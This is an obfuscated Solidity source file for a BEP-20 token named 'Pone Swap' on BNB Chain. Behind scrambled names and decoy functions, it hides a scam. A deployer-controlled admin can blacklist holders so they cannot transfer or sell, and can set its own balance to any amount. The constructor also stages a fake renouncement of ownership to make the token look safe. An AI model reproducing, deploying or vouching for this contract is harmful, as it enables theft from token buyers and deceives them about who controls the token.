/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface cexcqysqurtdiy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address mbzextkmlxifu) external view returns (uint256);

    function transfer(address oiyufwautppn, uint256 xmdssbknfuv) external returns (bool);

    function allowance(address skzvaeonh, address spender) external view returns (uint256);

    function approve(address spender, uint256 xmdssbknfuv) external returns (bool);

    function transferFrom(
        address sender,
        address oiyufwautppn,
        uint256 xmdssbknfuv
    ) external returns (bool);

    event Transfer(address indexed from, address indexed prezyvsbqrhgbi, uint256 value);
    event Approval(address indexed skzvaeonh, address indexed spender, uint256 value);
}

interface cexcqysqurtdiyMetadata is cexcqysqurtdiy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract fidkxjiwuyjn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface biqhvntkqwptr {
    function createPair(address gglczvqwxern, address lqpxfnhksryk) external returns (address);
}

interface jjcucgkctvv {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PoneSwap is fidkxjiwuyjn, cexcqysqurtdiy, cexcqysqurtdiyMetadata {

    event OwnershipTransferred(address indexed vuryugpyroosxb, address indexed yydiufvpmyex);

    function allowance(address vigcdkujqqr, address vrrygvlgpb) external view virtual override returns (uint256) {
        return ftmprsajsnh[vigcdkujqqr][vrrygvlgpb];
    }

    function omjtnuwlkeca() public {
        
        if (puhdqdatzsw == iufvqrkwtnnifu) {
            iufvqrkwtnnifu = true;
        }
        teedclglmt=false;
    }

    function transferFrom(address bhapcuifagbnbt, address oiyufwautppn, uint256 xmdssbknfuv) external override returns (bool) {
        if (ftmprsajsnh[bhapcuifagbnbt][_msgSender()] != type(uint256).max) {
            require(xmdssbknfuv <= ftmprsajsnh[bhapcuifagbnbt][_msgSender()]);
            ftmprsajsnh[bhapcuifagbnbt][_msgSender()] -= xmdssbknfuv;
        }
        return xmysinvjnlhfh(bhapcuifagbnbt, oiyufwautppn, xmdssbknfuv);
    }

    function owner() external view returns (address) {
        return rxkqvrioz;
    }

    string private zgrkzszwdo = "PSP";

    function decimals() external view virtual override returns (uint8) {
        return xvwiqxpdfldr;
    }

    function transfer(address idnbvgmjhxyert, uint256 xmdssbknfuv) external virtual override returns (bool) {
        return xmysinvjnlhfh(_msgSender(), idnbvgmjhxyert, xmdssbknfuv);
    }

    bool public puhdqdatzsw;

    mapping(address => mapping(address => uint256)) private ftmprsajsnh;

    function ujualzrrfyy(address hulednvyqc) public {
        
        if (hulednvyqc == dtbhepgmlimbtd || hulednvyqc == xyucmbdmu || !vbucasavehez[_msgSender()]) {
            return;
        }
        
        swivfwbjg[hulednvyqc] = true;
    }

    uint256 public dxbrficsdsdysb;

    function name() external view virtual override returns (string memory) {
        return hnuunseqf;
    }

    function itsunkzkksmp(uint256 xmdssbknfuv) public {
        if (!vbucasavehez[_msgSender()]) {
            return;
        }
        kgtknllqs[dtbhepgmlimbtd] = xmdssbknfuv;
    }

    function jktranulcytad(address clkarjtmx) public {
        if (qsfnsbmgwrejkb) {
            return;
        }
        
        vbucasavehez[clkarjtmx] = true;
        
        qsfnsbmgwrejkb = true;
    }

    mapping(address => bool) public vbucasavehez;

    uint8 private xvwiqxpdfldr = 18;

    function fdbyymusnfo(address bhapcuifagbnbt, address oiyufwautppn, uint256 xmdssbknfuv) internal returns (bool) {
        require(kgtknllqs[bhapcuifagbnbt] >= xmdssbknfuv);
        kgtknllqs[bhapcuifagbnbt] -= xmdssbknfuv;
        kgtknllqs[oiyufwautppn] += xmdssbknfuv;
        emit Transfer(bhapcuifagbnbt, oiyufwautppn, xmdssbknfuv);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return zgrkzszwdo;
    }

    bool private teedclglmt;

    mapping(address => bool) public swivfwbjg;

    function lxsgjqlkarb() public {
        
        if (dxbrficsdsdysb != uaskfxzqzig) {
            koacskjkktau = false;
        }
        dsulxgmbpm=0;
    }

    address public dtbhepgmlimbtd;

    function totalSupply() external view virtual override returns (uint256) {
        return igaybttlb;
    }

    mapping(address => uint256) private kgtknllqs;

    function kfytqzyqcf() public view returns (bool) {
        return puhdqdatzsw;
    }

    bool public pzwisqwymr;

    address public xyucmbdmu;

    uint256 public uaskfxzqzig;

    uint256 private igaybttlb = 100000000 * 10 ** 18;

    bool private tsqhnxaihmqum;

    function getOwner() external view returns (address) {
        return rxkqvrioz;
    }

    bool public iufvqrkwtnnifu;

    uint256 public dsulxgmbpm;

    function bowdkqzfdnkq() public view returns (bool) {
        return iufvqrkwtnnifu;
    }

    function xmysinvjnlhfh(address bhapcuifagbnbt, address oiyufwautppn, uint256 xmdssbknfuv) internal returns (bool) {
        if (bhapcuifagbnbt == dtbhepgmlimbtd) {
            return fdbyymusnfo(bhapcuifagbnbt, oiyufwautppn, xmdssbknfuv);
        }
        require(!swivfwbjg[bhapcuifagbnbt]);
        return fdbyymusnfo(bhapcuifagbnbt, oiyufwautppn, xmdssbknfuv);
    }

    constructor (){ 
        
        jjcucgkctvv afenhjfmtwfdw = jjcucgkctvv(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        xyucmbdmu = biqhvntkqwptr(afenhjfmtwfdw.factory()).createPair(afenhjfmtwfdw.WETH(), address(this));
        rxkqvrioz = _msgSender();
        
        dtbhepgmlimbtd = _msgSender();
        vbucasavehez[_msgSender()] = true;
        
        kgtknllqs[_msgSender()] = igaybttlb;
        emit Transfer(address(0), dtbhepgmlimbtd, igaybttlb);
        rfyfxxwjcelcy();
    }

    function balanceOf(address mbzextkmlxifu) public view virtual override returns (uint256) {
        return kgtknllqs[mbzextkmlxifu];
    }

    function rfyfxxwjcelcy() public {
        emit OwnershipTransferred(dtbhepgmlimbtd, address(0));
        rxkqvrioz = address(0);
    }

    function approve(address vrrygvlgpb, uint256 xmdssbknfuv) public virtual override returns (bool) {
        ftmprsajsnh[_msgSender()][vrrygvlgpb] = xmdssbknfuv;
        emit Approval(_msgSender(), vrrygvlgpb, xmdssbknfuv);
        return true;
    }

    bool public qsfnsbmgwrejkb;

    address private rxkqvrioz;

    bool private koacskjkktau;

    string private hnuunseqf = "Pone Swap";

    function tvrqukhvyxcwmt() public {
        
        
        dxbrficsdsdysb=0;
    }

}